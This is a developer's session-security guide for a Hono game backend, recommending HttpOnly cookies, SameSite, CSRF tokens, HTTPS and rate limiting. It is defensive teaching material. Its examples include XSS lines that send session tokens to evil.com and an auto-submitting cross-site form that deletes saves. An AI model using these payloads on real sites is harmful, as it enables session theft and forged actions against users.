# Session Security Implementation Guide

## Overview

This document outlines security best practices for protecting user sessions from hijacking attacks.

---

## Current Security Status

### ✅ What We Have
- **UUID v4 session tokens** - 122 bits of entropy (5.3 × 10³⁶ possible values)
  - Guessing a valid token is computationally infeasible
  - Even at 1 billion attempts/second: ~168 trillion years for 50% chance
- **Time-limited sessions** - 1 hour expiry (configured in auth.service.ts:33)
- **Session lookup** - Database validation on each request

### ⚠️ Current Approach
- Sessions returned in JSON response body
- Client stores token (likely localStorage or memory)
- Token sent via `Authorization: Bearer <token>` header

### 🐛 Known Bug
**Location:** `src/domains/auth/auth.service.ts:57`

```typescript
// WRONG - returns 0-999 (milliseconds component only)
if (session.expires_at.getMilliseconds() < Date.now())

// CORRECT - returns full Unix timestamp
if (session.expires_at.getTime() < Date.now())
```

---

## Three Pillars of Session Security

## 1. HTTPS (Transport Layer Security)

### Protects Against
- **Man-in-the-middle (MITM) attacks** where attackers intercept network traffic
- Session tokens sent in plain text over HTTP can be captured on public WiFi, compromised routers, etc.

### How It Works
```
Without HTTPS:
Client → [Authorization: Bearer abc-123-xyz] → Attacker sees it → Server

With HTTPS:
Client → [Encrypted tunnel] → Server
             ↑
          Attacker sees gibberish
```

### Implementation
- **Production:** Required. Use reverse proxy (nginx, Cloudflare, Vercel) or hosting platform SSL
- **Development:** HTTP is acceptable locally
- **Cookie flag:** Set `Secure` flag so cookies only sent over HTTPS

---

## 2. HttpOnly Cookies

### Protects Against
- **XSS (Cross-Site Scripting) attacks** where malicious JavaScript steals tokens
- If attacker injects `<script>steal(document.cookie)</script>`, httpOnly cookies are inaccessible

### Current Vulnerability
```typescript
// Client stores token
localStorage.setItem('sessionToken', 'abc-123');

// Attacker's XSS payload steals it:
fetch('https://evil.com/steal?token=' + localStorage.getItem('sessionToken'));
// ❌ Token stolen!
```

### With HttpOnly Cookies
```typescript
// Server sets cookie
res.setHeader('Set-Cookie', 'sessionId=abc-123; HttpOnly; Secure; SameSite=Strict');

// JavaScript cannot access it:
document.cookie; // Returns everything EXCEPT httpOnly cookies

// Attacker's XSS payload fails:
fetch('https://evil.com/steal?token=' + document.cookie);
// ✅ Can't steal httpOnly cookies!
```

### Implementation in Hono

#### Login Endpoint (Set Cookie)
```typescript
// src/domains/auth/auth.controller.ts
authRouter.post('/login', async (c) => {
  const body = await c.req.json();
  const session = await authService.login(body);
  if (!session) return c.json({ error: 'Invalid credentials'}, 401);

  // Set httpOnly cookie instead of returning session ID in JSON
  c.header('Set-Cookie',
    `sessionId=${session.id}; HttpOnly; Secure; SameSite=Lax; Max-Age=3600; Path=/`
  );

  // Don't send session ID in response body
  return c.json({
    success: true,
    userId: session.player_id
  });
});
```

#### Auth Middleware (Read Cookie)
```typescript
// src/middleware/auth.middleware.ts
export const requireAuth = async (c, next) => {
  // Extract from cookie instead of Authorization header
  const cookies = c.req.header('Cookie') || '';
  const sessionId = cookies
    .split('; ')
    .find(cookie => cookie.startsWith('sessionId='))
    ?.split('=')[1];

  if (!sessionId) return c.json({ error: 'Unauthorized' }, 401);

  const session = await validateSession({ sessionId });
  if (!session) return c.json({ error: 'Invalid session' }, 401);

  c.set('userId', session.player_id);
  await next();
};

// Usage:
// app.get('/api/protected', requireAuth, async (c) => { ... });
```

### Cookie Flags Explained
- **HttpOnly** - JavaScript can't access it (prevents XSS theft)
- **Secure** - Only sent over HTTPS (prevents MITM)
- **SameSite=Lax** - Only sent to your domain on navigation + all same-site requests (prevents most CSRF)
- **SameSite=Strict** - Only sent on same-site requests (breaks if user clicks link from email/other site)
- **Max-Age=3600** - Expires in 1 hour (matches session expiry)
- **Path=/** - Available to all routes

---

## 3. CSRF Tokens (Cross-Site Request Forgery)

### Protects Against
Attacker tricks your browser into making authenticated requests from a malicious site.

### Attack Scenario
```html
<!-- User visits evil.com while logged into your game -->
<img src="https://yourgame.com/api/auth/logout" />
<!-- Browser automatically sends sessionId cookie! User is logged out -->

<!-- Worse: State-changing action -->
<form action="https://yourgame.com/api/game/delete-save" method="POST">
  <input type="hidden" name="saveId" value="all" />
</form>
<script>document.forms[0].submit();</script>
<!-- User's save deleted! -->
```

Because cookies are **automatically** sent by the browser to your domain, even from other sites.

### Defense Options

#### Option 1: SameSite Cookies (Recommended for Games)
```typescript
Set-Cookie: sessionId=abc; HttpOnly; Secure; SameSite=Lax
// Browser won't send cookie if request originates from another domain
```

**Trade-offs:**
- ✅ Simple, no code changes needed
- ✅ `Lax` allows GET requests from other sites (good UX)
- ⚠️ `Strict` breaks cross-site navigation (user appears logged out)

**Recommendation:** Use `SameSite=Lax` - adequate protection for most games.

#### Option 2: CSRF Tokens (Traditional)
Only needed if:
- API consumed by multiple domains/apps
- Need `SameSite=None` (cross-domain cookies)
- High-value financial transactions
- Extra compliance requirements

**How it works:**
1. Server generates random token, stores in session
2. Client receives token in response body (NOT cookie)
3. Client includes token in custom header on requests
4. Server verifies token matches session

```typescript
// On login: Generate CSRF token
const csrfToken = crypto.randomUUID();
await sessionRepository.update(session.id, { csrfToken });

return c.json({
  success: true,
  csrfToken // Client stores in memory/localStorage
});

// Middleware: Verify CSRF token
const csrfToken = c.req.header('X-CSRF-Token');
const session = await getSession();
if (session.csrfToken !== csrfToken) {
  return c.json({ error: 'CSRF validation failed' }, 403);
}

// Client: Include in requests
fetch('/api/game/save', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken,
  },
  body: JSON.stringify(data)
});
```

**Why this works:** Attacker's site can't read CSRF token (CORS) and can't set custom headers in form submissions.

---

## Comparison: Current vs. Recommended

### Current Approach (Authorization Header)
```typescript
// Client stores token
localStorage.setItem('token', session.id);

// Client sends manually
headers: { 'Authorization': `Bearer ${token}` }
```

**Security:**
- ❌ Vulnerable to XSS token theft
- ✅ Not vulnerable to CSRF (can't set Authorization header from other domains)
- ⚠️ Requires XSS prevention (input sanitization, CSP headers)

### Recommended Approach (HttpOnly Cookies)
```typescript
// Server sets cookie
Set-Cookie: sessionId=abc; HttpOnly; Secure; SameSite=Lax

// Browser sends automatically
// (no client code needed!)
```

**Security:**
- ✅ Protected from XSS (JavaScript can't access)
- ✅ Protected from CSRF (SameSite)
- ✅ Simpler client code (automatic)

**Trade-off:**
- Slightly more complex for mobile apps/non-browser clients
- Cookies are browser-specific (not ideal for API-only clients)

---

## Implementation Phases

### Phase 1: MVP (Current)
- [x] UUID v4 session tokens
- [x] Time-limited sessions (1 hour)
- [x] Session validation
- [ ] Fix `getMilliseconds()` bug in validateSession
- [ ] Add HTTPS in production
- [ ] Sanitize all user input (XSS prevention)
- [ ] Add Content-Security-Policy headers

**Acceptable for MVP if:**
- You prevent XSS through input sanitization
- Frontend served from same domain
- HTTPS enforced in production

### Phase 2: Production-Ready
- [ ] Switch to httpOnly cookies with SameSite=Lax
- [ ] Implement auth middleware for Hono
- [ ] Update login endpoint to set cookies
- [ ] Update logout endpoint to clear cookies
- [ ] Add rate limiting (see rate-limiting.md)
- [ ] Security headers (CSP, X-Frame-Options, etc.)

### Phase 3: Hardened (Optional)
- [ ] Add CSRF tokens (if needed for cross-domain)
- [ ] Session rotation on privilege escalation
- [ ] Implement refresh tokens (long-lived sessions)
- [ ] Add session device tracking
- [ ] Implement "logout all devices"

---

## Rate Limiting Recommendations

Session security pairs with rate limiting:

### Login Endpoint (Strict)
- **5-10 attempts per 15 minutes per IP**
- Prevents credential brute forcing

### Session Validation (Loose)
- **100+ requests per minute per IP**
- Legitimate users make many authenticated requests

### General API
- **60-100 requests per minute per user**
- Prevents abuse while allowing normal usage

**Implementation:** Use libraries like `@hono/rate-limiter` or Redis-based solutions.

---

## Additional Security Measures

### 1. Security Headers
```typescript
app.use('*', async (c, next) => {
  await next();
  c.header('X-Frame-Options', 'DENY');
  c.header('X-Content-Type-Options', 'nosniff');
  c.header('Referrer-Policy', 'strict-origin-when-cross-origin');
  c.header('Content-Security-Policy', "default-src 'self'");
});
```

### 2. Session Cleanup
- Implement `deleteExpired()` in session.repository.ts
- Run periodic cleanup job (cron/scheduled task)
- Remove expired sessions from database

### 3. Password Security
- Already using bcrypt ✅
- Consider adding password complexity requirements
- Add rate limiting to registration

### 4. Secure Session Rotation
- Generate new session ID after login
- Regenerate session on privilege changes
- Implement logout on password change

---

## Testing Checklist

Before going to production:

- [ ] All API calls use HTTPS
- [ ] Cookies have HttpOnly, Secure, SameSite flags
- [ ] Cannot steal session via XSS (test with injected script)
- [ ] Cannot perform CSRF (test from different origin)
- [ ] Session expires after 1 hour
- [ ] Logout invalidates session
- [ ] Rate limiting prevents brute force
- [ ] Security headers present in responses

---

## References

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [Hono Documentation](https://hono.dev/)
